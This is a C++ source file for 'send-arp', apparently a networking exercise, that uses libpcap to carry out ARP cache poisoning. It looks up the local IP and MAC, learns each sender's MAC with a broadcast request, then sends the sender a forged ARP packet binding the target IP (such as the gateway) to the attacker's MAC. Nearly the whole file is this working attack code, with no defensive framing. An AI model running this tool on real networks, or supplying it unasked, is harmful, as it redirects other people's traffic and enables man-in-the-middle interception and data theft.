#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <iostream>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0) {
		usage();
		return -1;
	}
	int fd;
	struct ifreq ifr;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	fd = socket(AF_INET, SOCK_DGRAM, 0);

    	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    	ifr.ifr_name[IFNAMSIZ - 1] = '\0';
    	if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
        	std::cerr << "Failed to get IP address" << std::endl;
        	return 1;
    	}
    	close(fd);

    	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    	char ipAddrStr[INET_ADDRSTRLEN];
    	inet_ntop(AF_INET, &ipaddr->sin_addr, ipAddrStr, INET_ADDRSTRLEN);
    	std::cout << "My IP: " << ipAddrStr << std::endl;
	char *my_ip = ipAddrStr;

    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	ifr.ifr_addr.sa_family = AF_INET;
    	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    	ioctl(fd, SIOCGIFHWADDR, &ifr);
    	close(fd);
   	std::cout << "MY MAC: ";
   	char my_mac[18];
    	for (int i = 0; i < 6; ++i) {
        	sprintf(&my_mac[i*3], "%02X:", (unsigned char)ifr.ifr_hwaddr.sa_data[i]);
    	}
    	my_mac[17] = '\0'; 
    	std::cout << my_mac << std::endl;	


	for (int i = 1; i < (argc/2); i++){
		char* sender = argv[2*i];
		char* target = argv[2*i+1];
		char* sender_mac;
		printf("%d\n", i);
		printf("Sender : %s\n", sender);
		printf("Target : %s\n", target);
		
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
		if (handle == nullptr) {
			printf("couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); 
		packet.eth_.smac_ = Mac(my_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(my_mac);
		packet.arp_.sip_ = htonl(Ip(my_ip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		Mac you_mac;
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				continue;
			}
			printf("%u bytes captured\n", header->caplen);
			
			EthHdr* eth = (EthHdr*)packet;
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
			if (eth->type() == EthHdr::Arp){
				you_mac = arp->smac();
				break;
			}
		}
		
		std::string you_mac_str = std::string(you_mac);
		printf("Attack %s\n", you_mac_str.c_str());

		packet.eth_.dmac_ = Mac(you_mac_str); 
		packet.eth_.smac_ = Mac(my_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(my_mac);
		//packet.arp_.smac_ = Mac("01:23:45:67:89:ab");
		packet.arp_.sip_ = htonl(Ip(target));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender));

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		pcap_close(handle);
	}
}
